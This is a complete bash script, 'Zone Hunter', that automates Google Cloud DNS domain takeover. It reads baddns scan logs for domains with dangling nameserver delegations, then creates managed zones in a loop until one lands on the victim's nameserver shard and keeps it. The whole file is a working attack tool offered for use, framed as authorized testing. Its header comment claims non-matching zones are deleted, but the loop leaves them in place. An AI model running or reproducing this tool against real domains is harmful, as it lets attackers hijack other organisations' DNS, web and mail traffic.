#!/bin/bash
# =====================================================================
# Zone Hunter - Google Cloud DNS Domain Takeover Toolkit
#
# A tool for identifying and exploiting dangling DNS delegation
# vulnerabilities in Google Cloud DNS.  Designed for authorized
# security testing.
#
# High-level workflow:
#   1. Load target nameservers (manual, file, or baddns log)
#   2. Validate       -- confirm NS match ns-cloud-{a-e}{1-4}.googledomains.com
#   3. Hunt zone      -- create managed zones until an NS set match
#   4. Cleanup        -- keep matching zone, delete non-matching immediately
#
# Usage:
#   ./google-zone-hunter.sh -z example.com -n "ns-cloud-a1.googledomains.com ns-cloud-a2.googledomains.com"
#   ./google-zone-hunter.sh -z example.com --parse-ns-from scan.baddns.log
#   ./google-zone-hunter.sh --parse-ns-from scan.baddns.log          # multi-target from baddns
#   ./google-zone-hunter.sh -c -p dns-check                          # cleanup only
#   ./google-zone-hunter.sh --parse-baddns scan.baddns.log           # parse & display baddns targets
#
# Author: Oleksandr Kazymyrov
# =====================================================================

set -euo pipefail

# =====================================================================
# Constants
# =====================================================================

DEFAULT_LIMIT=100
DEFAULT_SLEEP=0.5
DEFAULT_PREFIX="dns-check"

# Google Cloud DNS NS pattern: ns-cloud-{a-e}{1-4}.googledomains.com
GOOGLE_NS_REGEX='^ns-cloud-[a-e][1-4]\.googledomains\.com\.?$'
GOOGLE_NS_EXTRACT_REGEX='ns-cloud-[a-e][1-4]\.googledomains\.com'

# =====================================================================
# Color Helpers
# =====================================================================

_supports_color() {
    [[ -t 1 ]] && return 0
    [[ -n "${TERM:-}" || -n "${WT_SESSION:-}" || -n "${ANSICON:-}" ]] && return 0
    return 1
}

color_green()  { _supports_color && printf '\033[92m%s\033[0m' "$1" || printf '%s' "$1"; }
color_red()    { _supports_color && printf '\033[91m%s\033[0m' "$1" || printf '%s' "$1"; }
color_yellow() { _supports_color && printf '\033[93m%s\033[0m' "$1" || printf '%s' "$1"; }
color_blue()   { _supports_color && printf '\033[94m%s\033[0m' "$1" || printf '%s' "$1"; }

# =====================================================================
# Logging
# =====================================================================

VERBOSE=0
LOG_FILE=""

log_info()    { echo "$(date '+%Y-%m-%d %H:%M:%S') [INFO] $*"; if [[ -n "$LOG_FILE" ]]; then echo "$(date '+%Y-%m-%d %H:%M:%S') [INFO] $*" >> "$LOG_FILE"; fi; }
log_warn()    { echo "$(date '+%Y-%m-%d %H:%M:%S') [WARN] $*"; if [[ -n "$LOG_FILE" ]]; then echo "$(date '+%Y-%m-%d %H:%M:%S') [WARN] $*" >> "$LOG_FILE"; fi; }
log_error()   { echo "$(date '+%Y-%m-%d %H:%M:%S') [ERROR] $*" >&2; if [[ -n "$LOG_FILE" ]]; then echo "$(date '+%Y-%m-%d %H:%M:%S') [ERROR] $*" >> "$LOG_FILE"; fi; }
log_debug()   { if [[ "$VERBOSE" -eq 1 ]]; then echo "$(date '+%Y-%m-%d %H:%M:%S') [DEBUG] $*"; fi; if [[ -n "$LOG_FILE" ]]; then echo "$(date '+%Y-%m-%d %H:%M:%S') [DEBUG] $*" >> "$LOG_FILE"; fi; }

# =====================================================================
# Default Values
# =====================================================================

LIMIT="$DEFAULT_LIMIT"
PREFIX="$DEFAULT_PREFIX"
TARGET_NS_RAW=""
DNS_NAME=""
PARSE_NS_FROM=""
PARSE_BADDNS_FILE=""
SLEEP_BETWEEN="$DEFAULT_SLEEP"
DRY_RUN=0
CLEANUP_ONLY=0
CURRENT_ZONE=""

# =====================================================================
# Target tracking (arrays)
# =====================================================================

# Single-target shard (from -n flag)
TARGET_SHARD=""

# BadDNS multi-target arrays (parallel arrays: index -> target, shard)
BADDNS_TARGETS=()
BADDNS_SHARDS=()

# =====================================================================
# Graceful Shutdown
# =====================================================================

SHUTDOWN_REQUESTED=0

_signal_handler() {
    if [[ "$SHUTDOWN_REQUESTED" -eq 1 ]]; then
        log_warn "Force quit requested"
        # Emergency cleanup of current zone
        if [[ -n "$CURRENT_ZONE" ]]; then
            gcloud dns managed-zones delete "$CURRENT_ZONE" --quiet > /dev/null 2>&1 || true
        fi
        exit 1
    fi
    SHUTDOWN_REQUESTED=1
    log_warn "Shutdown requested - finishing current attempt, then stopping..."
}

trap '_signal_handler' SIGINT SIGTERM

# =====================================================================
# Usage
# =====================================================================

usage() {
    cat <<'EOF'
Zone Hunter - Google Cloud DNS Domain Takeover Toolkit

Usage:
  ./google-zone-hunter.sh [OPTIONS]

Required (one of):
  -z <zone_dns_name>           FQDN of the zone to create, e.g. example.com
  --parse-ns-from <file>       Extract Google NS from baddns log (auto-detects
                               target domains; overrides -n)

Required (unless --parse-ns-from or --parse-baddns or -c is used):
  -n <target_ns>               Target NS to look for (space or comma separated),
                               e.g. "ns-cloud-a1.googledomains.com ns-cloud-a2.googledomains.com"

Options:
  -p <prefix>                  Prefix for managed zone names (default: dns-check)
  -l <limit>                   Max number of attempts (default: 100)
  --sleep <seconds>            Sleep between attempts (default: 0.5)
  --dry-run                    Preview actions without creating resources
  --log-file <path>            Write logs to file
  -v, --verbose                Enable debug logging
  -c                           Cleanup only: delete all zones matching prefix, then exit
  --parse-baddns <file>        Parse baddns log and display Google Cloud DNS targets
                               (no zone creation)

Examples:
  # Single target with specific NS
  ./google-zone-hunter.sh -z example.com -n "ns-cloud-a1.googledomains.com"

  # Multi-target auto-detection from baddns log
  ./google-zone-hunter.sh --parse-ns-from scan.baddns.log

  # Single target with NS extracted from baddns log
  ./google-zone-hunter.sh -z example.com --parse-ns-from scan.baddns.log

  # Dry run
  ./google-zone-hunter.sh -z example.com -n ns-cloud-a1.googledomains.com --dry-run

  # Cleanup all zones with prefix
  ./google-zone-hunter.sh -c -p dns-check

  # Parse and display baddns targets
  ./google-zone-hunter.sh --parse-baddns scan.baddns.log

EOF
    exit 1
}

# =====================================================================
# Dependency Check
# =====================================================================

check_dependencies() {
    local missing=0
    if ! command -v gcloud &>/dev/null; then
        log_error "gcloud CLI is not installed or not in PATH."
        missing=1
    fi
    if ! command -v jq &>/dev/null; then
        log_error "jq is not installed. Install it: apt install jq / brew install jq"
        missing=1
    fi
    if [[ "$missing" -eq 1 ]]; then
        exit 1
    fi
}

# =====================================================================
# NS Validation
# =====================================================================

normalize_ns() {
    local ns="$1"
    # Ensure trailing dot
    [[ "${ns}" == *. ]] && echo "$ns" || echo "${ns}."
}

validate_google_ns() {
    # Validate against Google Cloud DNS pattern (with or without trailing dot)
    local ns="${1%.}"  # strip trailing dot for validation
    [[ "$ns" =~ $GOOGLE_NS_REGEX ]] || echo "$ns" | grep -qiE '^ns-cloud-[a-e][1-4]\.googledomains\.com$'
}

# =====================================================================
# BadDNS Parsing
# =====================================================================

extract_shard_from_ns() {
    # Extract shard letter (a-e) from a Google NS name
    local ns="$1"
    echo "$ns" | grep -oP '(?<=ns-cloud-)[a-e]' | head -1
}

parse_baddns_targets() {
    # Parse baddns log and populate BADDNS_TARGETS[] and BADDNS_SHARDS[]
    local filepath="$1"
    if [[ ! -f "$filepath" ]]; then
        log_error "File not found: $filepath"
        exit 1
    fi

    BADDNS_TARGETS=()
    BADDNS_SHARDS=()

    local -A seen_targets=()

    while IFS= read -r line; do
        # Skip non-JSON lines
        [[ "$line" == "{"* ]] || continue

        # Parse with jq
        local signature target trigger indicator
        signature=$(echo "$line" | jq -r '.signature // empty' 2>/dev/null) || continue
        indicator=$(echo "$line" | jq -r '.indicator // empty' 2>/dev/null) || true
        trigger=$(echo "$line" | jq -r '.trigger // empty' 2>/dev/null) || continue

        # Accept entries where signature or indicator references Google/googledomains
        local is_google=0
        case "$signature" in
            "Google Cloud DNS"|"cloud.google.com"|*googledomains*|*google*cloud*) is_google=1 ;;
        esac
        if [[ "$is_google" -eq 0 ]]; then
            # Fall back: check indicator and trigger for googledomains
            if echo "$indicator $trigger" | grep -qiE 'googledomains'; then
                is_google=1
            fi
        fi
        [[ "$is_google" -eq 1 ]] || continue

        target=$(echo "$line" | jq -r '.target // empty' 2>/dev/null) || continue

        [[ -n "$target" && -n "$trigger" ]] || continue
        # Deduplicate by target
        [[ -z "${seen_targets[$target]+x}" ]] || continue
        seen_targets["$target"]=1

        # Extract shard letter from first Google NS in trigger
        local shard=""
        local ns
        for ns in $(echo "$trigger" | tr ',' '\n' | tr -d ' '); do
            if echo "$ns" | grep -qiE "$GOOGLE_NS_EXTRACT_REGEX"; then
                shard=$(extract_shard_from_ns "$ns")
                if [[ -n "$shard" ]]; then break; fi
            fi
        done

        if [[ -n "$shard" ]]; then
            BADDNS_TARGETS+=("$target")
            BADDNS_SHARDS+=("$shard")
        fi
    done < "$filepath"

    if [[ ${#BADDNS_TARGETS[@]} -gt 0 ]]; then
        log_info "Parsed ${#BADDNS_TARGETS[@]} target(s) from baddns log: $(IFS=', '; echo "${BADDNS_TARGETS[*]}")"
    else
        log_warn "No Google Cloud DNS targets found in $filepath"
    fi
}

extract_shard_from_file() {
    # Extract first Google Cloud DNS shard letter from any file using grep
    local filepath="$1"
    if [[ ! -f "$filepath" ]]; then
        log_error "File not found: $filepath"
        exit 1
    fi

    local found
    found=$(grep -oiE "$GOOGLE_NS_EXTRACT_REGEX" "$filepath" | head -1) || true

    if [[ -z "$found" ]]; then
        log_warn "No Google nameservers found in $filepath"
        return
    fi

    TARGET_SHARD=$(extract_shard_from_ns "$found")
    if [[ -n "$TARGET_SHARD" ]]; then
        log_info "Extracted shard '$TARGET_SHARD' from $filepath"
    fi
}

# =====================================================================
# Load Target NS
# =====================================================================

load_targets() {
    # --parse-ns-from takes precedence
    if [[ -n "$PARSE_NS_FROM" ]]; then
        # Parse baddns targets for multi-target support
        parse_baddns_targets "$PARSE_NS_FROM"

        # If no baddns targets found, try extracting shard from the file
        if [[ ${#BADDNS_TARGETS[@]} -eq 0 ]]; then
            extract_shard_from_file "$PARSE_NS_FROM"
            if [[ -z "$TARGET_SHARD" ]]; then
                log_error "No Google nameservers extracted from $PARSE_NS_FROM"
                exit 1
            fi
        fi

        # Summarize unique shards
        local -A shard_counts=()
        if [[ ${#BADDNS_TARGETS[@]} -gt 0 ]]; then
            local i
            for ((i=0; i<${#BADDNS_TARGETS[@]}; i++)); do
                local s="${BADDNS_SHARDS[$i]}"
                shard_counts["$s"]=$(( ${shard_counts[$s]:-0} + 1 ))
            done
            local summary=""
            for s in $(printf '%s\n' "${!shard_counts[@]}" | sort); do
                summary+="$s(${shard_counts[$s]}) "
            done
            log_info "Loaded ${#BADDNS_TARGETS[@]} target(s) - shards: ${summary% }"
        else
            log_info "Loaded shard '$TARGET_SHARD' (from --parse-ns-from)"
        fi
        return
    fi

    # -n flag: space or comma separated NS
    if [[ -n "$TARGET_NS_RAW" ]]; then
        local ns
        for ns in $(echo "$TARGET_NS_RAW" | tr ',' ' '); do
            [[ -n "$ns" ]] || continue
            if ! validate_google_ns "$ns"; then
                log_warn "Skipping non-Google NS: $ns"
                continue
            fi
            TARGET_SHARD=$(extract_shard_from_ns "$ns")
            if [[ -n "$TARGET_SHARD" ]]; then
                break  # only need one shard letter
            fi
        done
    fi

    if [[ -z "$TARGET_SHARD" && ${#BADDNS_TARGETS[@]} -eq 0 ]]; then
        log_error "No target shard identified. Use -n or --parse-ns-from"
        exit 1
    fi

    log_info "Loaded target shard: $TARGET_SHARD"
}

# =====================================================================
# Zone Cleanup Helpers
# =====================================================================

cleanup_zone() {
    # Safely delete a single zone
    local zone_name="$1"
    [[ -n "$zone_name" ]] || return
    gcloud dns managed-zones delete "$zone_name" --quiet > /dev/null 2>&1 || true
    log_debug "Deleted zone $zone_name"
}

cleanup_by_prefix() {
    # Delete all zones matching the prefix pattern
    local prefix="$1"
    log_info "Looking for zones matching prefix '$prefix'..."

    local zones
    zones=$(gcloud dns managed-zones list --format="value(name)" 2>/dev/null | grep -E "^${prefix}-" || true)

    if [[ -z "$zones" ]]; then
        echo "  $(color_green 'No zones found matching prefix. Nothing to delete.')"
        return
    fi

    local count=0
    count=$(echo "$zones" | wc -l)
    echo "  $(color_yellow "Found $count zone(s) matching prefix '${prefix}-*'")"
    echo ""

    while IFS= read -r zone; do
        [[ -n "$zone" ]] || continue
        echo -n "  Deleting $zone... "
        if gcloud dns managed-zones delete "$zone" --quiet > /dev/null 2>&1; then
            echo "$(color_green 'Deleted')"
        else
            echo "$(color_red 'Failed')"
        fi
    done <<< "$zones"

    echo ""
    echo "  Cleanup complete."
}

# =====================================================================
# Command: parse-baddns (standalone display)
# =====================================================================

cmd_parse_baddns() {
    local filepath="$1"
    if [[ ! -f "$filepath" ]]; then
        log_error "File not found: $filepath"
        exit 1
    fi

    parse_baddns_targets "$filepath"

    if [[ ${#BADDNS_TARGETS[@]} -eq 0 ]]; then
        echo "No Google Cloud DNS targets found."
        return
    fi

    # Collect unique shards
    local -A shard_counts=()
    local i
    for ((i=0; i<${#BADDNS_TARGETS[@]}; i++)); do
        local s="${BADDNS_SHARDS[$i]}"
        shard_counts["$s"]=$(( ${shard_counts[$s]:-0} + 1 ))
    done

    echo ""
    echo "$(color_blue '============================================================')"
    echo "  BadDNS Log Analysis - Google Cloud DNS Dangling NS Records"
    echo "$(color_blue '============================================================')"
    echo "  Total vulnerable targets: ${#BADDNS_TARGETS[@]}"
    echo "  Unique shards:            ${#shard_counts[@]}"
    echo ""

    for ((i=0; i<${#BADDNS_TARGETS[@]}; i++)); do
        echo "  $(color_yellow "Target #$((i+1)): ${BADDNS_TARGETS[$i]}") (shard ${BADDNS_SHARDS[$i]})"
    done

    echo ""
    echo "$(color_blue '============================================================')"
    echo "  Shards:"
    for s in $(printf '%s\n' "${!shard_counts[@]}" | sort); do
        echo "    shard $s -- ${shard_counts[$s]} target(s)"
    done
    echo "$(color_blue '============================================================')"
}

# =====================================================================
# Command: hunt-zone (main loop)
# =====================================================================

cmd_hunt_zone() {
    # Build list of (dns_name, expected_shard) pairs to hunt
    local -a hunt_domains=()
    local -a hunt_shards=()

    if [[ ${#BADDNS_TARGETS[@]} -gt 0 ]]; then
        hunt_domains=("${BADDNS_TARGETS[@]}")
        hunt_shards=("${BADDNS_SHARDS[@]}")
    else
        # Single-target mode from -z / -n flags
        hunt_domains=("$DNS_NAME")
        hunt_shards=("$TARGET_SHARD")
    fi

    local total_targets=${#hunt_domains[@]}

    # == Banner ==
    echo ""
    echo "$(color_blue '============================================================')"
    echo "  $(color_blue 'Google Cloud DNS Zone Hunter')"
    echo "$(color_blue '============================================================')"
    echo "  Targets:       $total_targets domain(s)"
    local banner_idx
    for ((banner_idx=0; banner_idx<total_targets; banner_idx++)); do
        echo "                 ${hunt_domains[$banner_idx]}  (shard ${hunt_shards[$banner_idx]})"
    done
    echo "  Max attempts:  $LIMIT (per target)"
    echo "  Sleep:         ${SLEEP_BETWEEN}s"
    echo "  Prefix:        $PREFIX"
    if [[ "$DRY_RUN" -eq 1 ]]; then echo "  Dry run:       yes"; else echo "  Dry run:       no"; fi
    echo "$(color_blue '============================================================')"
    echo ""

    if [[ "$DRY_RUN" -eq 1 ]]; then
        log_info "[DRY RUN] Would create up to $LIMIT zones per target looking for:"
        local di
        for ((di=0; di<total_targets; di++)); do
            log_info "  - ${hunt_domains[$di]} (shard ${hunt_shards[$di]})"
        done
        return
    fi

    # == Per-target outer loop ==
    local target_idx
    for ((target_idx=0; target_idx<total_targets; target_idx++)); do
        local current_dns="${hunt_domains[$target_idx]}"
        local expected_shard="${hunt_shards[$target_idx]}"

        # Ensure DNS name ends with a dot
        if [[ "${current_dns: -1}" != "." ]]; then
            current_dns="${current_dns}."
        fi

        echo ""
        echo "$(color_blue '------------------------------------------------------------')"
        echo "  Target $((target_idx+1))/$total_targets: $current_dns (expected shard: $expected_shard)"
        echo "$(color_blue '------------------------------------------------------------')"

        local found=0
        local -a created_zones=()

        for ((attempt=1; attempt<=LIMIT; attempt++)); do
            # Check graceful shutdown
            if [[ "$SHUTDOWN_REQUESTED" -eq 1 ]]; then
                log_info "Stopping (user interrupt)"
                return
            fi

            # Generate zone resource name
            local random_suffix
            random_suffix=$(head -c 6 /dev/urandom | od -An -tx1 | tr -d ' \n' | head -c 6)
            local zone_name="${PREFIX}-${attempt}-${random_suffix}"
            zone_name="${zone_name:0:63}"
            CURRENT_ZONE="$zone_name"

            log_info "Attempt $attempt/$LIMIT -- $current_dns -- creating zone '$zone_name'..."

            # Create zone
            local create_output
            local create_exit=0
            create_output=$(gcloud dns managed-zones create "$zone_name" \
                --dns-name="$current_dns" \
                --description="Zone hunter attempt $attempt" \
                --quiet 2>&1) || create_exit=$?

            if [[ $create_exit -ne 0 ]]; then
                log_error "Failed to create zone '$zone_name':"
                echo "$create_output" | sed 's/^/    /'

                # Try to clean up the failed zone if partially created
                cleanup_zone "$zone_name"
                CURRENT_ZONE=""

                # Delete all previously created zones for this target
                if [[ ${#created_zones[@]} -gt 0 ]]; then
                    log_warn "Cleaning up ${#created_zones[@]} zone(s) created for $current_dns"
                    local cz
                    for cz in "${created_zones[@]}"; do
                        cleanup_zone "$cz"
                    done
                fi

                log_warn "Skipping target $current_dns due to error"
                break
            fi

            created_zones+=("$zone_name")

            # Get assigned NS via describe
            local assigned_ns_raw
            assigned_ns_raw=$(gcloud dns managed-zones describe "$zone_name" --format="value(nameServers)" 2>/dev/null) || true
            if [[ -z "$assigned_ns_raw" ]]; then
                log_error "Failed to describe zone '$zone_name' - deleting and continuing"
                cleanup_zone "$zone_name"
                CURRENT_ZONE=""
                sleep "$SLEEP_BETWEEN"
                continue
            fi

            # Extract assigned shard letter from NS (e.g. "d" from ns-cloud-d1)
            local assigned_shard=""
            for ns in $(echo "$assigned_ns_raw" | tr ';' '\n'); do
                [[ -n "$ns" ]] || continue
                assigned_shard=$(echo "$ns" | grep -oP '(?<=ns-cloud-)[a-e]' | head -1)
                if [[ -n "$assigned_shard" ]]; then
                    break
                fi
            done

            echo "  Created shard: ${assigned_shard:-?} | Expected: $expected_shard"

            if [[ "$assigned_shard" == "$expected_shard" ]]; then
                # ========== MATCH ==========
                echo ""
                echo "$(color_green '============================================================')"
                echo "  $(color_green 'MATCH - Shard matched!')"
                echo "$(color_green '============================================================')"
                echo "  Target domain:     $current_dns"
                echo "  Expected shard:    $expected_shard"
                echo "  Zone kept:         $zone_name"
                echo "$(color_green '============================================================')"
                log_info "Keeping zone '$zone_name' for $current_dns (shard $assigned_shard)"
                CURRENT_ZONE=""
                found=1
                break
            fi

            # ========== No match -- leave zone, continue ==========
            log_info "Shard mismatch ($assigned_shard != $expected_shard) - leaving zone '$zone_name'"
            CURRENT_ZONE=""
            sleep "$SLEEP_BETWEEN"
        done

        if [[ "$found" -eq 0 ]]; then
            log_warn "Exhausted $LIMIT attempts for $current_dns (shard $expected_shard) - moving on"
        fi
    done

    log_info "Hunt complete - processed $total_targets target(s)"
}

# =====================================================================
# Argument Parsing (long options via while/case)
# =====================================================================

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -z)
                DNS_NAME="$2"; shift 2
                ;;
            -n)
                TARGET_NS_RAW="$2"; shift 2
                ;;
            -p)
                PREFIX="$2"; shift 2
                ;;
            -l)
                LIMIT="$2"; shift 2
                ;;
            -c)
                CLEANUP_ONLY=1; shift
                ;;
            -v|--verbose)
                VERBOSE=1; shift
                ;;
            --parse-ns-from)
                PARSE_NS_FROM="$2"; shift 2
                ;;
            --parse-baddns)
                PARSE_BADDNS_FILE="$2"; shift 2
                ;;
            --sleep)
                SLEEP_BETWEEN="$2"; shift 2
                ;;
            --dry-run)
                DRY_RUN=1; shift
                ;;
            --log-file)
                LOG_FILE="$2"; shift 2
                ;;
            -h|--help)
                usage
                ;;
            *)
                log_error "Unknown option: $1"
                usage
                ;;
        esac
    done
}

# =====================================================================
# Main
# =====================================================================

main() {
    parse_args "$@"
    check_dependencies

    # == parse-baddns mode ====================================
    if [[ -n "$PARSE_BADDNS_FILE" ]]; then
        cmd_parse_baddns "$PARSE_BADDNS_FILE"
        exit 0
    fi

    # == cleanup-only mode ====================================
    if [[ "$CLEANUP_ONLY" -eq 1 ]]; then
        echo ""
        echo "$(color_blue '============================================================')"
        echo "  $(color_blue 'Google Cloud DNS Zone Cleanup')"
        echo "$(color_blue '============================================================')"
        echo "  Prefix: $PREFIX"
        echo "$(color_blue '============================================================')"
        echo ""
        cleanup_by_prefix "$PREFIX"
        exit 0
    fi

    # == hunt-zone mode =======================================
    # Validate required arguments
    if [[ -z "$DNS_NAME" && -z "$PARSE_NS_FROM" ]]; then
        log_error "Missing required arguments. Use -z <zone> and -n <ns>, or --parse-ns-from <file>"
        usage
    fi

    if [[ -z "$TARGET_NS_RAW" && -z "$PARSE_NS_FROM" ]]; then
        log_error "Missing target NS. Use -n <ns> or --parse-ns-from <file>"
        usage
    fi

    # Load and validate targets (shards)
    load_targets

    # Run hunt
    cmd_hunt_zone
}

main "$@"
